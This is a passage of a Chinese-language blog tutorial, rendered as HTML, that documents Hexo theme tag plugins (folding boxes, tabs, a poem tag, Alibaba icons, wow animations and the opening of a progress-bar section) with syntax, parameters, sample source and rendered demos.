to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&#123;% folding 查看图片测试 %&#125;</span><br><span class="line"></span><br><span class="line">![](<span class="link">https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg</span>)</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding cyan open, 查看默认打开的折叠框 %&#125;</span><br><span class="line"></span><br><span class="line">这是一个默认打开的折叠框。</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding green, 查看代码测试 %&#125;</span><br><span class="line">假装这里有代码块（代码块没法嵌套代码块）</span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding yellow, 查看列表测试 %&#125;</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> haha</span><br><span class="line"><span class="bullet">-</span> hehe</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding red, 查看嵌套测试 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding blue, 查看嵌套测试2 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding 查看嵌套测试3 %&#125;</span><br><span class="line"></span><br><span class="line">hahaha <span class="language-xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/tieba/%E6%BB%91%E7%A8%BD.png&#x27;</span> <span class="attr">style</span>=<span class="string">&#x27;height:24px&#x27;</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><details class="folding-tag" ><summary> 查看图片测试 </summary>              <div class='content'>              <p><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg" alt=""></p>              </div>            </details><details class="folding-tag" cyan open><summary> 查看默认打开的折叠框 </summary>              <div class='content'>              <p>这是一个默认打开的折叠框。</p>              </div>            </details><details class="folding-tag" green><summary> 查看代码测试 </summary>              <div class='content'>              <p>假装这里有代码块（代码块没法嵌套代码块）</p>              </div>            </details><details class="folding-tag" yellow><summary> 查看列表测试 </summary>              <div class='content'>              <ul><li>haha</li><li>hehe</li></ul>              </div>            </details><details class="folding-tag" red><summary> 查看嵌套测试 </summary>              <div class='content'>              <details class="folding-tag" blue><summary> 查看嵌套测试2 </summary>              <div class='content'>              <details class="folding-tag" ><summary> 查看嵌套测试3 </summary>              <div class='content'>              <p>hahaha <span><img src='https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/tieba/%E6%BB%91%E7%A8%BD.png' style='height:24px'></span></p>              </div>            </details>              </div>            </details>              </div>            </details><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-21-分栏-tab">2.21 分栏 tab</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs Unique name, [index] %&#125;</span><br><span class="line">&lt;!-- tab [Tab caption] [@icon] --&gt;</span><br><span class="line">Any content (support inline tags too).</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><p>Unique name :</p><ul><li><p>选项卡块标签的唯一名称，不带逗号。</p></li><li><p>将在#id中用作每个标签及其索引号的前缀。</p></li><li><p>如果名称中包含空格，则对于生成#id，所有空格将由破折号代替。</p></li><li><p>仅当前帖子/页面的URL必须是唯一的！</p></li></ul></li><li><p>[index]:</p><ul><li><p>活动选项卡的索引号。</p></li><li><p>如果未指定，将选择第一个标签（1）。</p></li><li><p>如果index为-1，则不会选择任何选项卡。</p></li><li><p>可选参数。</p></li></ul></li><li><p>[Tab caption]:</p><ul><li><p>当前选项卡的标题。</p></li><li><p>如果未指定标题，则带有制表符索引后缀的唯一名称将用作制表符的标题。</p></li><li><p>如果未指定标题，但指定了图标，则标题将为空。</p></li><li><p>可选参数。</p></li></ul></li><li><p>[@icon]:</p><ul><li><p>FontAwesome图标名称（全名，看起来像“ fas fa-font”）</p></li><li><p>可以指定带空格或不带空格；</p></li><li><p>例如’Tab caption @icon’ 和 ‘Tab caption@icon’.</p></li><li><p>可选参数。</p></li></ul></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.Demo 1 - 预设选择第一个【默认】</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs test1 %&#125;</span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 1.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 2.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 3.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><p>2.Demo 2 - 预设选择tabs</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs test2, 3 %&#125;</span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 1.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 2.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 3.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><p>3.Demo 3 - 没有预设值</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs test3, -1 %&#125;</span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 1.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 2.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 3.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><p>4.Demo 4 - 自定义Tab名 + 只有icon + icon和Tab名</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs test4 %&#125;</span><br><span class="line">&lt;!-- tab 第一个Tab --&gt;</span><br><span class="line"><span class="strong">**tab名字为第一个Tab**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab @fab fa-apple-pay --&gt;</span><br><span class="line"><span class="strong">**只有图标 没有Tab名字**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab 炸弹@fas fa-bomb --&gt;</span><br><span class="line"><span class="strong">**名字+icon**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.Demo 1 - 预设选择第一个【默认】</p><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">test1 1</button></li><li class="tab"><button type="button" data-href="#test1-2">test1 2</button></li><li class="tab"><button type="button" data-href="#test1-3">test1 3</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><p><strong>This is Tab 1.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><p><strong>This is Tab 2.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-3"><p><strong>This is Tab 3.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><p>2.Demo 2 - 预设选择tabs</p><div class="tabs" id="test2"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#test2-1">test2 1</button></li><li class="tab"><button type="button" data-href="#test2-2">test2 2</button></li><li class="tab active"><button type="button" data-href="#test2-3">test2 3</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="test2-1"><p><strong>This is Tab 1.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test2-2"><p><strong>This is Tab 2.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content active" id="test2-3"><p><strong>This is Tab 3.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><p>3.Demo 3 - 没有预设值</p><div class="tabs" id="test3"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#test3-1">test3 1</button></li><li class="tab"><button type="button" data-href="#test3-2">test3 2</button></li><li class="tab"><button type="button" data-href="#test3-3">test3 3</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="test3-1"><p><strong>This is Tab 1.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test3-2"><p><strong>This is Tab 2.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test3-3"><p><strong>This is Tab 3.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><p>4.Demo 4 - 自定义Tab名 + 只有icon + icon和Tab名</p><div class="tabs" id="test4"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test4-1">第一个Tab</button></li><li class="tab"><button type="button" data-href="#test4-2"><i class="fab fa-apple-pay" style="text-align: center;"></i></button></li><li class="tab"><button type="button" data-href="#test4-3"><i class="fas fa-bomb"></i>炸弹</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test4-1"><p><strong>tab名字为第一个Tab</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test4-2"><p><strong>只有图标 没有Tab名字</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test4-3"><p><strong>名字+icon</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-22-诗词标签-poem">2.22 诗词标签 poem</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><ol><li><code>title</code>：诗词标题</li><li><code>author</code>：作者，可以不写</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;% poem 水调歌头,苏轼 %&#125;</span><br><span class="line">丙辰中秋，欢饮达旦，大醉，作此篇，兼怀子由。</span><br><span class="line">明月几时有？把酒问青天。</span><br><span class="line">不知天上宫阙，今夕是何年？</span><br><span class="line">我欲乘风归去，又恐琼楼玉宇，高处不胜寒。</span><br><span class="line">起舞弄清影，何似在人间？</span><br><span class="line"></span><br><span class="line">转朱阁，低绮户，照无眠。</span><br><span class="line">不应有恨，何事长向别时圆？</span><br><span class="line">人有悲欢离合，月有阴晴圆缺，此事古难全。</span><br><span class="line">但愿人长久，千里共婵娟。</span><br><span class="line">&#123;% endpoem %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><div class='poem'><div class='poem-title'>水调歌头</div><div class='poem-author'>苏轼</div><p>丙辰中秋，欢饮达旦，大醉，作此篇，兼怀子由。<br>明月几时有？把酒问青天。<br>不知天上宫阙，今夕是何年？<br>我欲乘风归去，又恐琼楼玉宇，高处不胜寒。<br>起舞弄清影，何似在人间？</p><p>转朱阁，低绮户，照无眠。<br>不应有恨，何事长向别时圆？<br>人有悲欢离合，月有阴晴圆缺，此事古难全。<br>但愿人长久，千里共婵娟。</p></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-23-阿里图标-icon">2.23 阿里图标 icon</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% icon [icon-xxxx],[font-size] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>icon-xxxx</code>：表示图标<code>font-class</code>,可以在自己的阿里矢量图标库项目的<code>font-class</code>引用方案内查询并复制。</li><li><code>font-size</code>：表示图标大小，直接填写数字即可，单位为<code>em</code>。图标大小默认值为<code>1em</code>。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#123;% icon icon-rat<span class="emphasis">_zi %&#125;&#123;% icon icon-rat,2 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-ox_</span>chou,3 %&#125;&#123;% icon icon-ox,4 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-tiger<span class="emphasis">_yin,5 %&#125;&#123;% icon icon-tiger,6 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-rabbit_</span>mao,1 %&#125;&#123;% icon icon-rabbit,2 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-dragon<span class="emphasis">_chen,3 %&#125;&#123;% icon icon-dragon,4 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-snake_</span>si,5 %&#125;&#123;% icon icon-snake,6 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-horse<span class="emphasis">_wu %&#125;&#123;% icon icon-horse,2 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-goat_</span>wei,3 %&#125;&#123;% icon icon-goat,4 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-monkey<span class="emphasis">_shen,5 %&#125;&#123;% icon icon-monkey,6 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-rooster_</span>you %&#125;&#123;% icon icon-rooster,2 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-dog<span class="emphasis">_xu,3 %&#125;&#123;% icon icon-dog,4 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-boar_</span>hai,5 %&#125;&#123;% icon icon-boar,6 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#icon-rat_zi"></use></svg><svg class="icon" style="width:2em; height:2em" aria-hidden="true"><use xlink:href="#icon-rat"></use></svg></p><p><svg class="icon" style="width:3em; height:3em" aria-hidden="true"><use xlink:href="#icon-ox_chou"></use></svg><svg class="icon" style="width:4em; height:4em" aria-hidden="true"><use xlink:href="#icon-ox"></use></svg></p><p><svg class="icon" style="width:5em; height:5em" aria-hidden="true"><use xlink:href="#icon-tiger_yin"></use></svg><svg class="icon" style="width:6em; height:6em" aria-hidden="true"><use xlink:href="#icon-tiger"></use></svg></p><p><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#icon-rabbit_mao"></use></svg><svg class="icon" style="width:2em; height:2em" aria-hidden="true"><use xlink:href="#icon-rabbit"></use></svg></p><p><svg class="icon" style="width:3em; height:3em" aria-hidden="true"><use xlink:href="#icon-dragon_chen"></use></svg><svg class="icon" style="width:4em; height:4em" aria-hidden="true"><use xlink:href="#icon-dragon"></use></svg></p><p><svg class="icon" style="width:5em; height:5em" aria-hidden="true"><use xlink:href="#icon-snake_si"></use></svg><svg class="icon" style="width:6em; height:6em" aria-hidden="true"><use xlink:href="#icon-snake"></use></svg></p><p><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#icon-horse_wu"></use></svg><svg class="icon" style="width:2em; height:2em" aria-hidden="true"><use xlink:href="#icon-horse"></use></svg></p><p><svg class="icon" style="width:3em; height:3em" aria-hidden="true"><use xlink:href="#icon-goat_wei"></use></svg><svg class="icon" style="width:4em; height:4em" aria-hidden="true"><use xlink:href="#icon-goat"></use></svg></p><p><svg class="icon" style="width:5em; height:5em" aria-hidden="true"><use xlink:href="#icon-monkey_shen"></use></svg><svg class="icon" style="width:6em; height:6em" aria-hidden="true"><use xlink:href="#icon-monkey"></use></svg></p><p><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#icon-rooster_you"></use></svg><svg class="icon" style="width:2em; height:2em" aria-hidden="true"><use xlink:href="#icon-rooster"></use></svg></p><p><svg class="icon" style="width:3em; height:3em" aria-hidden="true"><use xlink:href="#icon-dog_xu"></use></svg><svg class="icon" style="width:4em; height:4em" aria-hidden="true"><use xlink:href="#icon-dog"></use></svg></p><p><svg class="icon" style="width:5em; height:5em" aria-hidden="true"><use xlink:href="#icon-boar_hai"></use></svg><svg class="icon" style="width:6em; height:6em" aria-hidden="true"><use xlink:href="#icon-boar"></use></svg></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-24-特效标签wow">2.24 特效标签wow</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow [animete],[duration],[delay],[offset],[iteration] %&#125;</span><br><span class="line">内容</span><br><span class="line">&#123;% endwow %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>animate</code>: 动画样式，效果详见<a href="https://animate.style/">animate.css参考文档</a></li><li><code>duration</code>: 选填项，动画持续时间，单位可以是<code>ms</code>也可以是<code>s</code>。例如<code>3s</code>，<code>700ms</code>。</li><li><code>delay</code>: 选填项，动画开始的延迟时间，单位可以是<code>ms</code>也可以是<code>s</code>。例如<code>3s</code>，<code>700ms</code>。</li><li><code>offset</code>: 选填项，开始动画的距离（相对浏览器底部）</li><li><code>iteration</code>: 选填项，动画重复的次数</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.flip动画效果。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__zoomIn,5s,5s,100,10 %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note blue &#x27;fas fa-bullhorn&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`zoomIn`动画效果，持续`5s`，延时`5s`，离底部`100`距离时启动，重复`10`次</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure><p>2.zoomIn动画效果，持续5s，延时5s，离底部100距离时启动，重复10次</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__zoomIn,5s,5s,100,10 %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note blue &#x27;fas fa-bullhorn&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`zoomIn`动画效果，持续`5s`，延时`5s`，离底部`100`距离时启动，重复`10`次</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure><p>3.slideInRight动画效果，持续5s，延时5s</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__slideInRight,5s,5s %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note orange &#x27;fas fa-car&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`slideInRight`动画效果，持续`5s`，延时`5s`。</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure><p>4.heartBeat动画效果，延时5s，重复10次。此处注意不用的参数位置要留空，用逗号间隔。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__heartBeat,,5s,,10 %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note red &#x27;fas fa-battery-half&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`heartBeat`动画效果，延时`5s`，重复`10`次。</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.flip动画效果。</p><div class='wow animate__zoomIn' data-wow-duration='5s' data-wow-delay='5s' data-wow-offset='100'  data-wow-iteration='10' ><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p><code>zoomIn</code>动画效果，持续<code>5s</code>，延时<code>5s</code>，离底部<code>100</code>距离时启动，重复<code>10</code>次</p></div></div><p>2.zoomIn动画效果，持续5s，延时5s，离底部100距离时启动，重复10次</p><div class='wow animate__zoomIn' data-wow-duration='5s' data-wow-delay='5s' data-wow-offset='100'  data-wow-iteration='10' ><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p><code>zoomIn</code>动画效果，持续<code>5s</code>，延时<code>5s</code>，离底部<code>100</code>距离时启动，重复<code>10</code>次</p></div></div><p>3.slideInRight动画效果，持续5s，延时5s</p><div class='wow animate__slideInRight' data-wow-duration='5s' data-wow-delay='5s' data-wow-offset=''  data-wow-iteration='' ><div class="note orange icon-padding modern"><i class="note-icon fas fa-car"></i><p><code>slideInRight</code>动画效果，持续<code>5s</code>，延时<code>5s</code>。</p></div></div><p>4.heartBeat动画效果，延时5s，重复10次。此处注意不用的参数位置要留空，用逗号间隔。</p><div class='wow animate__heartBeat' data-wow-duration='' data-wow-delay='5s' data-wow-offset=''  data-wow-iteration='10' ><div class="note red icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p><code>heartBeat</code>动画效果，延时<code>5s</code>，重复<code>10</code>次。</p></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-25-进度条-progress">2.25  进度条 progress</h2><div class="note info flat"><p>进度条标签参考<a href="https://rongbuqiu.com/jdt.html">沂佰孜猫-给HEXO文章添加彩色进度条</a>。<br>源样式提取自<a href="https://zwying0814.gitbook.io/cuteen/">Cuteen</a>主题。</p></div><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">参数配置</button></li><li class="tab"><button type="button" 